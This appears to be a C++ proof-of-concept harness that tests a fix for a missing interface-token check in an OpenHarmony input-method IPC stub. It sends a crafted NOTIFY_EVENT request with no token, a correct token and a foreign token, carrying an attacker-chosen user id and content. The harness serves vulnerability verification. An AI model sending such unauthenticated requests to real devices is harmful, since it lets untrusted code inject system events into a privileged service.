// PoC harness for the missing interface-descriptor check in
// PlatformCallbackStub::OnRemoteRequest (inputmethod_imf, PR !228).
//
// The vulnerable and fixed bodies of platform_callback_stub.cpp are compiled
// unchanged. The harness sends the same well-formed NOTIFY_EVENT request three
// ways and reports what the service did:
//
//   notoken     no interface token at all  <- the attack
//   token       the correct token          <- positive control
//   wrongtoken  a foreign token
//
// Expected: with the fix, `notoken` is rejected before the body is read; without
// the fix it reaches notifyEvent and posts to the service message queue.
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>

#include "message_handler.h"
#include "message_parcel.h"
#include "message_option.h"
#include "observations.h"
#include "platform_callback_stub.h"

using namespace OHOS;
using namespace OHOS::MiscServices;

namespace {
constexpr int32_t kAttackerUserId = 4242;
constexpr int32_t kContentCount = 2;

const char16_t *kCorrectDescriptor = u"ohos.miscservices.inputmethod.IPlatformCallback";
const char16_t *kForeignDescriptor = u"ohos.attacker.IPlatformCallback";

// A body the service accepts: a known CommonEvent, an attacker-chosen user id,
// and some content.
void writeBody(MessageParcel &parcel)
{
    parcel.WriteInt32(CommonEvent::COMMON_EVENT_USER_LOCKED);
    parcel.WriteInt32(kAttackerUserId);
    parcel.WriteInt32(kContentCount);
    for (int32_t i = 0; i < kContentCount; i++) {
        parcel.WriteString16(u"attacker-controlled");
    }
}
} // namespace

int main(int argc, char **argv)
{
    std::string mode = (argc > 1) ? argv[1] : "notoken";

    PlatformCallbackStub stub;
    MessageParcel data;
    MessageParcel reply;
    MessageOption option;

    if (mode == "token") {
        data.WriteInterfaceToken(kCorrectDescriptor);
    } else if (mode == "wrongtoken") {
        data.WriteInterfaceToken(kForeignDescriptor);
    } else if (mode != "notoken") {
        printf("harness_error=unknown_mode\n");
        return 2;
    }
    writeBody(data);
    data.RewindRead(0);

    poc::sent().clear();
    int ret = stub.OnRemoteRequest(IPlatformCallback::NOTIFY_EVENT, data, reply, option);

    printf("mode=%s ret=%d messages_sent=%zu", mode.c_str(), ret, poc::sent().size());
    for (const auto &record : poc::sent()) {
        printf(" [msgId=%d userId=%d contentCount=%d contentBytes=%zu]",
               record.msgId, record.userId, record.contentCount, record.contentBytes);
    }
    printf("\n");
    return 0;
}
